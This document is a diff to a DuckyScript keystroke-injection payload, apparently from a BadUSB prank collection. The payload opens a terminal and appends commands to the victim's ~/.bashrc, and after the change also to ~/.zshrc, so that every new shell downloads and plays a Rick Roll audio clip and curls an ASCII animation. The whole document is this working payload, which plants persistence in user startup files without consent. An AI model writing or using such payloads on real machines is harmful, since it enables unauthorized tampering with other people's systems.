@@ -12,7 +12,7 @@ WINDOWS d
 DELAY 300
 CTRL-ALT t
 DELAY 2000
-STRING echo "wget -q -O - https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/RickRoll/TerminalRickRoll/roll.s16 2>/dev/null | aplay -Dplug:default -q -f S16_LE -r 8000 & curl ascii.live/rick & disown" >> ~/.bashrc
+STRING echo "wget -q -O - https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/RickRoll/TerminalRickRoll/roll.s16 2>/dev/null | aplay -Dplug:default -q -f S16_LE -r 8000 & curl ascii.live/rick &" >> ~/.zshrc && echo "wget -q -O - https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/RickRoll/TerminalRickRoll/roll.s16 2>/dev/null | aplay -Dplug:default -q -f S16_LE -r 8000 & curl ascii.live/rick &" >> ~/.bashrc
 DELAY 300
 ENTER
 DELAY 300
